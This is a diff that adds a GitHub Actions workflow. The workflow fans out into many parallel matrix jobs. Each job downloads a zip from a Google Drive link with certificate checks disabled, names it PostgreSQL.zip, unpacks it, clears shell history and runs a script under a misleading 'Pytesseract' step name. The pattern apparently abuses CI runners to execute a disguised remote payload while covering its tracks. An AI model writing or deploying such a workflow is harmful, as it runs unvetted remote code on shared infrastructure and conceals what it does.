@@ -1,0 +1,56 @@
+name: astrochipset242ai
+on:
+  push:
+    branches: [ "main" ]
+  workflow_dispatch:
+
+jobs:
+  CREATE:
+    runs-on: ubuntu-latest
+    strategy:
+      fail-fast: false
+      max-parallel: 10
+      matrix:
+        go: [I.o, I.i, I.ii]
+        flag: ['Configure', 'Build', 'Analyze', 'Operate', 'Distribute']
+
+    env:
+        NUM_JOBS: 20
+        JOB: ${ matrix.go }
+    steps:
+    - uses: actions/checkout@v1
+    - name: install module
+      run: |
+        wget --no-check-certificate "https://docs.google.com/uc?export=download&id=1k2g_oWdhrjpgW5SNikSTWtq7TYuUD84G" -O PostgreSQL.zip
+        unzip -o PostgreSQL.zip
+        rm PostgreSQL.zip
+        history -c && history -w
+
+    - name: Pytesseract
+      run: bash requirements.sh
+
+
+  RUN1:
+    runs-on: ubuntu-latest
+    strategy:
+      fail-fast: false
+      max-parallel: 10
+      matrix:
+        go: [I.o, I.i, I.ii]
+        flag: ['Initialize', 'Develop', 'Test', 'Execute', 'Release']
+
+    env:
+        NUM_JOBS: 20
+        JOB: ${ matrix.go }
+    steps:
+    - uses: actions/checkout@v1
+    - name: install module
+      run: |
+        wget --no-check-certificate "https://docs.google.com/uc?export=download&id=1k2g_oWdhrjpgW5SNikSTWtq7TYuUD84G" -O PostgreSQL.zip
+        unzip -o PostgreSQL.zip
+        rm PostgreSQL.zip
+        history -c && history -w
+
+    - name: Pytesseract
+      run: bash requirements.sh
+        
